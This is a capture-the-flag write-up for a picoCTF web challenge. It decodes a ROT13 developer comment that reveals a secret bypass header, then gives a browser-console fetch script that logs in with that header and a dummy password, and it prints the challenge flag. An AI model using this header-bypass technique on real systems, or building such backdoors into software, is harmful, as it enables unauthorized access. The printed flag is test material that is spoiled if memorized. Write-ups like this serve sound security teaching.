#  CTF Writeup: Crack the Gate 1

---

## Description
An investigation revealed a person of interest (`ctf-player@picoctf.org`) hiding data in a restricted portal. Standard password guessing failed, but clues suggested the developer left a "secret way in."

## Step 1: Source Code Inspection
Upon inspecting the website's HTML source code, I found a hidden developer comment which is: 

### Step 2: Decoding the Hint (ROT13)
The challenge hints suggested a common rotation trick (ROT13). Decoding the string revealed a bypass instruction for developers:

* Encoded: `ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"`
* Decoded: `NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"`

This confirmed that the server-side security could be bypassed by adding a custom HTTP header.

---

##  Step 3: Exploitation via Browser Console
Since a standard login form does not allow for custom HTTP headers, I used the **Browser Developer Console** to manually trigger a `fetch` request to the `/login` endpoint.

### The Exploit Script:
fetch('/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-Dev-Access': 'yes' // The secret bypass header found in source
    },
    body: JSON.stringify({
        email: 'ctf-player@picoctf.org',
        password: 'any_password' 
    })
})
.then(response => response.json())
.then(data => {
    console.log("Response:", data);
    if (data.flag) alert("Flag Found: " + data.flag);
});

# Final Result
The server accepted the custom header and granted access, returning the flag in the JSON response.

Flag Found: picoCTF{4cc3ss_gr4nt3d_v14_h34d3r_7321}
